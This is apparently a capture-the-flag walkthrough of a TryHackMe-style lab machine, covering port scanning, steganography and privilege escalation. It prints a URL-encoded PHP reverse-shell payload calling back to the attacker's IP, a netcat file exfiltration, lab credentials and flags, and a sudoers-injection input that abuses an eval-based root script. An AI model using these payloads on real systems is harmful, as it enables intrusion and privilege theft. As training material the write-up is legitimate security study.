[[Writeup]]

![[Pasted image 20250504165129.png]]

Join us in the mission to protect the digital world of superheroes! U.A., the most renowned Superhero Academy, is looking for a superhero to test the security of our new site.

Our site is a reflection of our school values, designed by our engineers with incredible Quirks. We have gone to great lengths to create a secure platform that reflects the exceptional education of the U.A.

Please allow the machine 3 - 5 minutes to fully boot.

## Enumeration

```
┌──(dd0x㉿kali)-[~]
└─$ nmap -p- --min-rate 10000 10.10.170.142                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-04 04:52 EDT
Nmap scan report for 10.10.170.142
Host is up (0.27s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.83 seconds

```

```
┌──(dd0x㉿kali)-[~]
└─$ nmap -p 22,80 -sCV 10.10.170.142
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-04 04:52 EDT
Nmap scan report for 10.10.170.142
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
|   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
|_  256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: U.A. High School
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.02 seconds
```



![[Pasted image 20250504165551.png]]


what we found from the gobuster is the `/asset/`

![[Pasted image 20250504165637.png]]

now it says that `./php` which we can do this `/assets/index.php`
![[Pasted image 20250504165715.png]]

since it is using php we can use reverse shell for this payload `php%20-r%20%27%24sock%3Dfsockopen%28%2210.23.62.59%22%2C9001%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27` from revshells.com
![[Pasted image 20250504165813.png]]

lets setup our netcat
```
┌──(dd0x㉿kali)-[~]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.23.62.59] from (UNKNOWN) [10.10.170.142] 50844
```

now paste it from the url with the payload `10.10.170.142/assets/index.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.23.62.59%22%2C9001%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27`

![[Pasted image 20250504165958.png]]

```
┌──(dd0x㉿kali)-[~]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.23.62.59] from (UNKNOWN) [10.10.170.142] 50844
ls
images
index.php
styles.css
whoami
www-data
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


i used `python3 -c 'import pty;pty.spawn("/bin/bash")';` to show the terminal `pty` for easier to look in to those directory.

```
python3 -c 'import pty;pty.spawn("/bin/bash")';
www-data@myheroacademia:/var/www/html/assets$ ls
ls
images  index.php  styles.css
www-data@myheroacademia:/var/www/html/assets$ cd index.php
cd index.php
bash: cd: index.php: Not a directory
www-data@myheroacademia:/var/www/html/assets$ cd images
cd images
www-data@myheroacademia:/var/www/html/assets/images$ ls
ls
oneforall.jpg  yuei.jpg
www-data@myheroacademia:/var/www/html/assets/images$ nc 10.23.62.59 < oneforall.jpg
</html/assets/images$ nc 10.23.62.59 < oneforall.jpg 
nc: missing port number
www-data@myheroacademia:/var/www/html/assets/images$ nc 10.23.62.59 4444 < oneforall.jpg
</assets/images$ nc 10.23.62.59 4444 < oneforall.jpg 
www-data@myheroacademia:/var/www/html/assets/images$ 
```

after downlaoding the `.jpg` i tried lookingup the file but it does not work it is corrupted so i look to google some python code for restorying jpg file  from https://github.com/Haxrein/MagicBytes/blob/main/magicbytes.py

now i check first what parameters to use this `magicbytes.py` -h.
```
┌──(dd0x㉿kali)-[~]
└─$ python3 ~/Downloads/magicbytes.py -h
/home/kali/Downloads/magicbytes.py:6: SyntaxWarning: invalid escape sequence '\/'
  print("|  \/  |           (_)    | ___ \     | | github.com/Haxrein       ")
/home/kali/Downloads/magicbytes.py:8: SyntaxWarning: invalid escape sequence '\/'
  print("| |\/| |/ _` |/ _` | |/ __| ___ \ | | | __/ _ \/ __| | '_ \| | | | ")
/home/kali/Downloads/magicbytes.py:9: SyntaxWarning: invalid escape sequence '\_'
  print("| |  | | (_| | (_| | | (__| |_/ / |_| | ||  __/\__ \_| |_) | |_| | ")
/home/kali/Downloads/magicbytes.py:10: SyntaxWarning: invalid escape sequence '\_'
  print("\_|  |_/\__,_|\__, |_|\___\____/ \__, |\__\___||___(_) .__/ \__, | ")
___  ___            _     ______       _                           
|  \/  |           (_)    | ___ \     | | github.com/Haxrein       
| .  . | __ _  __ _ _  ___| |_/ /_   _| |_ ___  ___   _ __  _   _  
| |\/| |/ _` |/ _` | |/ __| ___ \ | | | __/ _ \/ __| | '_ \| | | | 
| |  | | (_| | (_| | | (__| |_/ / |_| | ||  __/\__ \_| |_) | |_| | 
\_|  |_/\__,_|\__, |_|\___\____/ \__, |\__\___||___(_) .__/ \__, | 
               __/ |              __/ |              | |     __/ | 
              |___/              |___/               |_|    |___/

Example usage: magicbytes.py -i broken.png -m png
```

so this is the command:
`python3 magicbytes.py -i oneforall.jpg -m jpg`

```
┌──(dd0x㉿kali)-[~]
└─$ python3 ~/Downloads/magicbytes.py -i oneforall.jpg -m jpg
/home/kali/Downloads/magicbytes.py:6: SyntaxWarning: invalid escape sequence '\/'
  print("|  \/  |           (_)    | ___ \     | | github.com/Haxrein       ")
/home/kali/Downloads/magicbytes.py:8: SyntaxWarning: invalid escape sequence '\/'
  print("| |\/| |/ _` |/ _` | |/ __| ___ \ | | | __/ _ \/ __| | '_ \| | | | ")
/home/kali/Downloads/magicbytes.py:9: SyntaxWarning: invalid escape sequence '\_'
  print("| |  | | (_| | (_| | | (__| |_/ / |_| | ||  __/\__ \_| |_) | |_| | ")
/home/kali/Downloads/magicbytes.py:10: SyntaxWarning: invalid escape sequence '\_'
  print("\_|  |_/\__,_|\__, |_|\___\____/ \__, |\__\___||___(_) .__/ \__, | ")
___  ___            _     ______       _                           
|  \/  |           (_)    | ___ \     | | github.com/Haxrein       
| .  . | __ _  __ _ _  ___| |_/ /_   _| |_ ___  ___   _ __  _   _  
| |\/| |/ _` |/ _` | |/ __| ___ \ | | | __/ _ \/ __| | '_ \| | | | 
| |  | | (_| | (_| | | (__| |_/ / |_| | ||  __/\__ \_| |_) | |_| | 
\_|  |_/\__,_|\__, |_|\___\____/ \__, |\__\___||___(_) .__/ \__, | 
               __/ |              __/ |              | |     __/ | 
              |___/              |___/               |_|    |___/

Magic bytes has been changed of oneforall.jpg as jpg

```

```
┌──(dd0x㉿kali)-[~]
└─$ file oneforall.jpg 
oneforall.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1140x570, components 3

```

It requres a password so we go back to the reversed shell terminal
```
┌──(dd0x㉿kali)-[~]
└─$ steghide --extract -sf oneforall.jpg  
Enter passphrase: 

```

Found a Hidden_Content Directory folder
```
www-data@myheroacademia:/var/www/html/assets$ cd ..
cd ..
www-data@myheroacademia:/var/www/html$ ls
ls
about.html  admissions.html  assets  contact.html  courses.html  index.html
www-data@myheroacademia:/var/www/html$ cd ..
cd ..
www-data@myheroacademia:/var/www$ ls
ls
Hidden_Content  html
www-data@myheroacademia:/var/www$ 
```

Now, we got the passphrase for the .jpg file
```
www-data@myheroacademia:/var/www$ cd Hidden_Content
cd Hidden_Content
www-data@myheroacademia:/var/www/Hidden_Content$ ls
ls
passphrase.txt
www-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt
cat passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg==
```

since `QWxsbWlnaHRGb3JFdmVyISEhCg==` cannot work and it is a base64 format we will code it:
```
┌──(dd0x㉿kali)-[~]
└─$ echo "QWxsbWlnaHRGb3JFdmVyISEhCg==" | base64 -d               
AllmightForEver!!!
```

lets try now to access the file:
```
┌──(dd0x㉿kali)-[~]
└─$ steghide --extract -sf oneforall.jpg           
Enter passphrase: 
wrote extracted data to "creds.txt".

```

after we extract the data we have this clue.
```
┌──(dd0x㉿kali)-[~]
└─$ cat creds.txt                 
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A

```

User: deku
Pass: One?For?All_!!one1/A

we can access this from the `ssh`

```
deku@myheroacademia:~$ ls
user.txt
deku@myheroacademia:~$ cat user.txt
THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
deku@myheroacademia:~$ 
```

To get the root flag lets check first using `sudo -l`

```
deku@myheroacademia:/$ sudo -l
[sudo] password for deku: 
Sorry, try again.
[sudo] password for deku: 
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh

```

Check the contents of feedback.sh
```
deku@myheroacademia:/$ cat /opt/NewComponent/feedback.sh
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
```

```
deku@myheroacademia:/opt/NewComponent$ sudo ./feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
deku ALL=NOPASSWD: ALL >> /etc/sudoers
It is This:
Feedback successfully saved.
```

```
deku@myheroacademia:/opt/NewComponent$ sudo -l
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
    (root) NOPASSWD: ALL

```

now you can run root priviledeges `sudo /bin/bash`

```
root@myheroacademia:/opt/NewComponent# ls
feedback.sh
root@myheroacademia:/opt/NewComponent# cd ..
root@myheroacademia:/opt# ls
NewComponent
root@myheroacademia:/opt# cd ..
root@myheroacademia:/# ls
bin   dev  home  lib32  libx32      media  opt   root  sbin  srv       sys  usr
boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  swap.img  tmp  var
root@myheroacademia:/# cd /root
root@myheroacademia:~# ls
root.txt  snap
root@myheroacademia:~# cat root.txt
root@myheroacademia:/opt/NewComponent# cat /root/root.txt
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                  _    _ 
             _   _        ___    | |  | |
            | \ | | ___  /   |   | |__| | ___ _ __  ___
            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 

THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
```